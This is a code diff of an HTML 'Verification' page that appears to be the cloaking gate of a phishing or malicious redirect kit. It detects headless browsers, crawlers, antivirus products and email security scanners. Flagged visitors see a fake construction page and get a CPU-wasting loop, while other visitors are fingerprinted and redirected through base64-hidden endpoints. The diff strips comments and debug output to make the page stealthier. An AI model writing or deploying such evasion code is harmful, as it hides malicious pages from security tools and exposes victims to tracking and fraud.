@@ -4,8 +4,6 @@
     <meta charset="utf-8" />
     <title>Verification</title>
     
-    <!-- reCAPTCHA Configuration (Dynamic from central config) -->
-    <!-- Fallback configuration in case server is unreachable -->
     <script>
       window.RECAPTCHA_CONFIG = {
         siteKey: '6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k',
@@ -14,21 +12,16 @@
         version: 'v3',
         scriptUrl: 'https://www.google.com/recaptcha/api.js?render=6LfUvO4rAAAAABz_j2gl1r_x8x3mVkstksZXVU-k'
       };
-      window.RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG.siteKey; // Legacy compatibility
+      window.RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG.siteKey;
     </script>
     
-    <!-- Load configuration from server (overrides fallback if available) -->
     <script src="https://campbellchamblissappraisers.com/config_recaptcha_public.php"></script>
     
-    <!-- Dynamically load reCAPTCHA script if enabled in configuration -->
     <script>
       if (window.RECAPTCHA_CONFIG && window.RECAPTCHA_CONFIG.enabled) {
         var script = document.createElement('script');
         script.src = window.RECAPTCHA_CONFIG.scriptUrl;
         document.head.appendChild(script);
-        console.log('✅ reCAPTCHA v3 script loading (enabled in config)');
-      } else {
-        console.log('ℹ️ reCAPTCHA v3 disabled in configuration');
       }
     </script>
     
@@ -182,31 +175,15 @@
 
     <script>
       (async function () {
-        // ============================================
-        // CONFIGURATION
-        // ============================================
-        // CONFIGURED FOR SEPARATE SERVER HOSTING
-        // API server: campbellchamblissappraisers.com
-        // HTML can be hosted anywhere (CORS enabled on API)
         const endpoint = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL2FwaS5waHA=");
         const redirectBase = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL3Byb2Nlc3MucGhw");
         
-        // reCAPTCHA Configuration (loaded dynamically from config_recaptcha.php)
         const RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.siteKey : '';
         const USE_RECAPTCHA = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.enabled : false;
         
-        const DEBUG = true; // Enable to see detailed logs in browser console
+        const DEBUG = false;
         const pageLoadTime = Date.now();
         
-        // ============================================
-        // BOT DETECTION & SECURITY LAYERS
-        // ============================================
-        // Aligned with m/js/utils.js security implementation
-        
-        /**
-         * Detect automation tools (Selenium, Puppeteer, Headless browsers)
-         * @returns {Object} Detection results
-         */
         function detectAutomation() {
           const results = {
             webdriver: false,
@@ -219,18 +196,15 @@
           };
           
           try {
-            // Check navigator.webdriver (set to true in Selenium/ChromeDriver)
             if (navigator.webdriver === true) {
               results.webdriver = true;
             }
             
-            // Check for headless browsers in user agent
             const ua = navigator.userAgent;
             if (/HeadlessChrome|HeadlessBrowser/i.test(ua)) {
               results.headlessUserAgent = true;
             }
             
-            // Check for PhantomJS
             if (/PhantomJS/i.test(ua)) {
               results.phantomJS = true;
             }
@@ -240,14 +214,12 @@
               results.phantomJS = true;
             }
             
-            // Check for Selenium-specific attributes
             if (document.documentElement.getAttribute('selenium') !== null ||
                 document.documentElement.getAttribute('webdriver') !== null ||
                 document.documentElement.getAttribute('driver') !== null) {
               results.seleniumAttrs = true;
             }
             
-            // Check for Selenium window properties
             for (const key in window) {
               if (key.includes('selenium') || 
                   key.includes('webdriver') || 
@@ -258,14 +230,12 @@
               }
             }
             
-            // Check for Puppeteer
             if (window.navigator.plugins.length === 0 && 
                 /Chrome/i.test(ua) && 
                 typeof window.chrome !== 'undefined') {
               results.puppeteer = true;
             }
             
-            // Overall bot detection
             results.isBot = results.webdriver || 
                            results.headlessUserAgent || 
                            results.phantomJS || 
@@ -279,14 +249,9 @@
           return results;
         }
         
-        /**
-         * Check if user agent matches known bots or security tools
-         * @returns {Object} Blocked status and reason
-         */
         function checkBotUserAgent() {
           const ua = navigator.userAgent.toLowerCase();
           
-          // Known bot signatures (matching m/js/utils.js)
           const botSignatures = [
             'googlebot', 'bingbot', 'yandexbot', 'slurp', 'duckduckbot', 'baiduspider',
             'bytespider', 'facebookexternalhit', 'twitterbot', 'rogerbot', 'linkedinbot',
@@ -297,7 +262,6 @@
             'puppeteer', 'phantom', 'nightmare', 'jsdom'
           ];
           
-          // Security tools and email scanners (matching m/js/utils.js)
           const securityTools = [
             'avast', 'avg', 'avira', 'bitdefender', 'kaspersky', 'mcafee', 'norton',
             'eset', 'f-secure', 'trend micro', 'sophos', 'symantec', 'trustwave', 'forcepoint',
@@ -306,7 +270,6 @@
             'zscaler', 'office365', 'microsoft-security', 'cisco', 'cofense'
           ];
           
-          // Check for bot signatures
           for (const signature of botSignatures) {
             if (ua.includes(signature)) {
               return { 
@@ -317,7 +280,6 @@
             }
           }
           
-          // Check for security tools
           for (const tool of securityTools) {
             if (ua.includes(tool)) {
               return { 
@@ -331,57 +293,41 @@
           return { blocked: false };
         }
         
-        /**
-         * Validate browser environment for legitimacy
-         * @returns {Boolean} True if environment looks legitimate
-         */
         function validateBrowserEnvironment() {
           try {
-            // Check for Chrome claiming to exist but window.chrome is missing
             if (navigator.userAgent.includes('Chrome') && typeof window.chrome === 'undefined') {
               return false;
             }
             
-            // Check for missing essential APIs (indicates sandboxed environment)
             if (typeof Blob === 'undefined' || 
                 typeof FileReader === 'undefined' || 
                 typeof Uint8Array === 'undefined') {
               return false;
             }
             
-            // Check for suspicious combination: no plugins AND no languages
             if (navigator.plugins.length === 0 && 
                 (!navigator.languages || navigator.languages.length === 0)) {
               return false;
             }
             
-            // Test Error.stack (sandboxes sometimes don't expose this correctly)
             const testError = new Error('test');
             if (!testError.stack || typeof testError.stack !== 'string') {
               return false;
             }
             
-            // Test Function constructor (often restricted in sandboxes)
             const testFunc = new Function('return true;');
             if (!testFunc()) {
               return false;
             }
             
           } catch (e) {
-            // Exception likely means restricted environment
             return false;
           }
           
           return true;
         }
         
-        /**
-         * Show bot trap page (fake "under construction" page)
-         * Matches m/js/utils.js bot trap system
-         * @param {String} reason - Reason for blocking
-         */
         function showBotTrap(reason) {
-          // Replace entire page with fake construction message
           document.body.innerHTML = `
             <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;color:#e0e0e0;">
               <div style="text-align:center;max-width:600px;padding:40px;">
@@ -396,32 +342,24 @@
             </div>
           `;
           
-          // CPU-intensive punishment loop (makes bot scanning expensive)
-          // This exhausts bot resources without affecting legitimate users
           setInterval(() => {
             let waste = 0;
             for (let i = 0; i < 1000000; i++) {
               waste += Math.sqrt(i) * Math.random();
             }
-            // Force garbage collection attempts
             if (waste > 0) {
               const temp = new Array(10000).fill(waste);
               temp.forEach((v, i) => temp[i] = Math.random());
             }
           }, 100);
           
-          // Log detection (for debugging, won't expose in production)
           if (DEBUG && typeof console !== 'undefined') {
-            console.log('Visitor blocked:', reason);
+            console.log('X');
           }
           
-          // Prevent further script execution
           throw new Error('Access denied');
         }
         
-        // ============================================
-        // BEHAVIORAL TRACKING
-        // ============================================
         let mouseMoved = false;
         let keyboardUsed = false;
         let scrollDetected = false;
@@ -430,12 +368,8 @@
         document.addEventListener('keypress', () => { keyboardUsed = true; }, { once: true });
         document.addEventListener('scroll', () => { scrollDetected = true; }, { once: true });
         
-        // ============================================
-        // BROWSER FINGERPRINTING
-        // ============================================
         function collectFingerprint() {
           const fp = {
-            // Screen info
             screen_width: screen.width,
             screen_height: screen.height,
             screen_avail_width: screen.availWidth,
@@ -443,7 +377,6 @@
             screen_color_depth: screen.colorDepth,
             screen_pixel_depth: screen.pixelDepth,
             
-            // Browser info
             user_agent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
@@ -451,26 +384,18 @@
             vendor: navigator.vendor || '',
             product: navigator.product || '',
             
-            // Timezone
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
             timezone_offset: new Date().getTimezoneOffset(),
             
-            // Hardware
             hardware_concurrency: navigator.hardwareConcurrency || 0,
             device_memory: navigator.deviceMemory || 0,
             max_touch_points: navigator.maxTouchPoints || 0,
             
-            // Browser features
             cookies_enabled: navigator.cookieEnabled,
             do_not_track: navigator.doNotTrack || '',
             
-            // WebGL
             webgl: checkWebGL(),
-            
-            // Canvas fingerprint
             canvas: getCanvasFingerprint(),
-            
-            // Plugins (limited in modern browsers)
             plugins_count: navigator.plugins ? navigator.plugins.length : 0
           };
           
@@ -503,12 +428,7 @@
           }
         }
         
-        // ============================================
-        // JAVASCRIPT CHALLENGE
-        // ============================================
         function solveChallenge(seed) {
-          // Simple challenge: MD5-like hash simulation
-          // In production, use actual crypto library
           let str = seed + 'challenge_secret_salt';
           let hash = 0;
           for (let i = 0; i < str.length; i++) {
@@ -518,17 +438,13 @@
           return Math.abs(hash).toString(16);
         }
         
-        // ============================================
-        // RECAPTCHA v3 EXECUTION
-        // ============================================
         async function getRecaptchaToken() {
           if (!USE_RECAPTCHA || !RECAPTCHA_SITE_KEY) {
-            return null; // Skip reCAPTCHA if disabled or no key
+            return null;
           }
           
           try {
             if (typeof grecaptcha === 'undefined') {
-              console.warn('reCAPTCHA not loaded');
               return null;
             }
             
@@ -539,62 +455,35 @@
           }
         }
         
-        // ============================================
-        // MAIN VERIFICATION
-        // ============================================
-        
-        // Wait a bit for user interaction tracking
         await new Promise(resolve => setTimeout(resolve, 500));
-        
-        // ============================================
-        // SECURITY LAYER 1: AUTOMATION DETECTION
-        // ============================================
-        if (DEBUG) console.log('🔒 Running security checks...');
         
         const automationCheck = detectAutomation();
         if (automationCheck.isBot) {
-          if (DEBUG) console.warn('❌ Automation detected:', automationCheck);
-          showBotTrap('automation_detected');
-          return; // Stop execution
+          showBotTrap('failed');
+          return;
         }
         
-        // ============================================
-        // SECURITY LAYER 2: BOT USER AGENT CHECK
-        // ============================================
         const botCheck = checkBotUserAgent();
         if (botCheck.blocked) {
-          if (DEBUG) console.warn('❌ Bot user agent detected:', botCheck.signature);
           showBotTrap(botCheck.reason);
-          return; // Stop execution
+          return;
         }
         
-        // ============================================
-        // SECURITY LAYER 3: BROWSER ENVIRONMENT VALIDATION
-        // ============================================
         const envValid = validateBrowserEnvironment();
         if (!envValid) {
-          if (DEBUG) console.warn('❌ Invalid browser environment');
-          showBotTrap('invalid_environment');
-          return; // Stop execution
+          showBotTrap('invalid');
+          return;
         }
         
-        if (DEBUG) console.log('✅ Security checks passed');
-        
         try {
-          if (DEBUG) console.log('🔍 Collecting data...');
-          
-          // Collect all data
           const fingerprint = collectFingerprint();
           const challengeSeed = Date.now().toString();
           const challengeSolution = solveChallenge(challengeSeed);
           const timing = Date.now() - pageLoadTime;
           
-          // Get reCAPTCHA token
           const recaptchaToken = await getRecaptchaToken();
           
-          if (DEBUG) console.log('📦 Data collected, sending to API...');
-          
-          // Send to API
+          // API call
           const controller = new AbortController();
           const timeout = setTimeout(() => controller.abort(), 15000);
           
@@ -619,30 +508,23 @@
           
           clearTimeout(timeout);
           
-          if (DEBUG) console.log('📥 Response status:', res.status);
-          
           if (!res.ok) {
-            console.error("API returned error status:", res.status);
-            // Try to get response text for debugging
-            const errorText = await res.text().catch(() => 'Could not read response');
-            console.error("API error response:", errorText);
-            throw new Error("API returned: " + res.status);
+            console.error("API error:", res.status);
+            const errorText = await res.text().catch(() => 'Error');
+            console.error("Response:", errorText);
+            throw new Error("API: " + res.status);
           }
 
           const data = await res.json();
           
-          if (DEBUG) console.log('📦 Response:', data);
-          
-          // Redirect with token
           if (data && data.token) {
             const type = (data.is_human === true) ? "human" : "denied";
-            if (DEBUG) console.log('✅ Redirecting:', type);
             location.replace(redirectBase + "?key=" + data.token + "&type=" + type);
             return;
           }
           
-          console.error("API response missing token:", data);
-          throw new Error("No token in response");
+          console.error("Missing token:", data);
+          throw new Error("No token");
           
         } catch (e) {
           console.error("❌ Error:", e);
@@ -653,16 +535,14 @@
           });
           console.error("API Endpoint:", endpoint);
           
-          // Provide helpful error message based on error type
           let errorDetails = e.message;
           let helpText = '';
           
           if (e.message.includes('Failed to fetch') || e.name === 'TypeError') {
-            errorDetails = 'Failed to fetch';
-            helpText = '<p style="font-size:11px;color:#999;margin-top:10px;">The verification API is not reachable. Please ensure this file is hosted on the same server as api.php</p>';
+            errorDetails = 'Connection error';
+            helpText = '<p style="font-size:11px;color:#999;margin-top:10px;">Unable to connect. Please try again.</p>';
           }
           
-          // Show error message to user instead of immediately redirecting
           document.getElementById('app').innerHTML = `
             <div class="error-container">
               <h2>Verification Error</h2>
@@ -674,17 +554,12 @@
               </button>
             </div>
           `;
-          
-          // Optional: redirect after showing error for 5 seconds
-          // setTimeout(() => {
-          //   location.replace("https://youtu.be/28Jgk08KTMA?si=aEuR7qlqhPIiFcvM");
-          // }, 5000);
         }
       })();
     </script>
 
     <noscript>
-      JavaScript is required to verify access.
+      JavaScript is required.
     </noscript>
   </body>
 </html>
